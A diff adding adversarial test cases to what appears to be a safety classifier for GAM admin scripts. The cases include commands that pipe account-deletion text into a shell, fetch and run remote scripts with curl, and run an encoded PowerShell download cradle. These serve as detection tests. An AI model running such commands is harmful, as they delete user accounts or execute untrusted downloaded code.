@@ -192,6 +192,7 @@ def test_adversarial(checker):
         ('gam update group s@example.com $ACTION member bob@example.com', g.UNKNOWN),
         ('gam $VERB user x@example.com', g.UNKNOWN),
         ('echo gam delete user x@example.com | sh', g.UNKNOWN),
+        ('gam print users\necho gam delete user x@example.com | sh', g.UNKNOWN),
         ('gam batch -', g.UNKNOWN),
         ('gam delete print users', g.UNKNOWN),
         ('gam select delete save', g.CHANGES),
@@ -599,6 +600,15 @@ AUDIT_2026_11 = [
     ('gam info domain\n%~dp0gam.exe delete user bob@example.com', 'batch', g.DESTRUCTIVE, 'floor'),
     ('gam info domain\n$users = 1\n$users | ForEach-Object { $_ }', 'powershell', g.READ, 'exact'),
     ('gam info domain\nrun() { "$@"; }', 'shell', g.READ, 'exact'),
+    # text piped into a shell, and downloaded code run without a pipe
+    ('gam info domain\nprintf "gam delete user bob@example.com\\n" | bash', 'shell', g.UNKNOWN, 'floor'),
+    ('gam info domain\necho gam delete user x@example.com | sudo sh -s', 'shell', g.UNKNOWN, 'floor'),
+    ('gam info domain\nsh -c "$(curl -fsSL https://example.com/install.sh)"', 'shell', g.SUSPICIOUS, 'floor'),
+    ('gam info domain\nbash <(curl -s https://example.com/x.sh)', 'shell', g.SUSPICIOUS, 'floor'),
+    ('gam info domain\npowershell -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA', 'powershell',
+     g.SUSPICIOUS, 'floor'),
+    ('gam print users | grep -c @ | python3 -c "import sys; print(sys.stdin.read())"\ngam print users | sort',
+     'shell', g.READ, 'exact'),
 ]
 
 
